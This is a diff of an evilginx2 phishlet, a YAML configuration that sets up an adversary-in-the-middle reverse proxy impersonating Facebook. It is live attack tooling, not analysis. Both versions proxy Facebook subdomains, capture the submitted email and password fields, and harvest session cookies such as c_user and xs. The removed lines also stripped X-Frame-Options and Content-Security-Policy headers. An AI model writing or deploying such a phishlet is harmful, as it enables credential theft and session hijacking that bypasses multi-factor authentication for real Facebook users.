@@ -1,6 +1,4 @@
 min_ver: '3.0.0'
-author: 'evilginx2'
-redirect_url: 'https://www.facebook.com/'
 
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
@@ -8,81 +6,34 @@ proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'web', orig_sub: 'web', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'mbasic', orig_sub: 'mbasic', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'touch', orig_sub: 'touch', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'static', orig_sub: 'static', domain: 'facebook.com', session: false, is_landing: false, auto_filter: true}
-  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'connect', orig_sub: 'connect', domain: 'facebook.net', session: false, is_landing: false, auto_filter: true}
 
-sub_filters:
-  # Replace Facebook URLs in HTML/JS
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://www\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://www\\.facebook\\.com/auth_platform', replace: 'https://{phish_sub_subdomain}.{domain}/auth_platform', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://m\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'login', domain: 'facebook.com', search: 'https://login\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'web', domain: 'facebook.com', search: 'https://web\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'mbasic', domain: 'facebook.com', search: 'https://mbasic\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'touch', domain: 'facebook.com', search: 'https://touch\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'connect', domain: 'facebook.com', search: 'https://connect\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'api', domain: 'facebook.com', search: 'https://api\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'graph', domain: 'facebook.com', search: 'https://graph\\.facebook\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  
-  # Replace Facebook CDN URLs
-  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'facebook.com', search: 'https://static\\.xx\\.fbcdn\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'facebook.com', search: 'https://[a-z0-9]+\\.fbcdn\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'facebook.com', search: 'https://fbstatic\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
-  
-  # Remove security headers
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'login', domain: 'facebook.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'login', domain: 'facebook.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
-  - {triggers_on: 'www.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
+sub_filters: []
 
 auth_tokens:
-  # Primary Facebook authentication cookies (ESSENTIAL)
   - domain: '.facebook.com'
-    keys: ['c_user', 'xs']
-    type: 'cookie'
-    force_post: false
+    keys: ['c_user', 'xs', 'fr', 'datr', 'sb']
 
 credentials:
   username:
     key: 'email'
     search: '(.*)'
     type: 'post'
-  
   password:
     key: 'pass'
     search: '(.*)'
     type: 'post'
-  
-  # Alternative email field
-  email:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
-  
-  # Phone number field
-  phone:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
-  
-  # Login identifier (can be email or phone)
-  login:
-    key: 'email'
-    search: '(.*)'
-    type: 'post'
 
 auth_urls:
-  - '^/home\.php'
-  - '^/checkpoint/'
-  - '^/login/device-based/regular/login/success/'
-  - '^/auth_platform/'
+  - '/home.php'
+  - '/checkpoint/'
+  - '/?sk=welcome'
 
 login:
   domain: 'www.facebook.com'
-  path: '/'
+  path: '/login/'
 
+path_rewrite:
+  - trigger: '/verification'
+    target: '/login/'
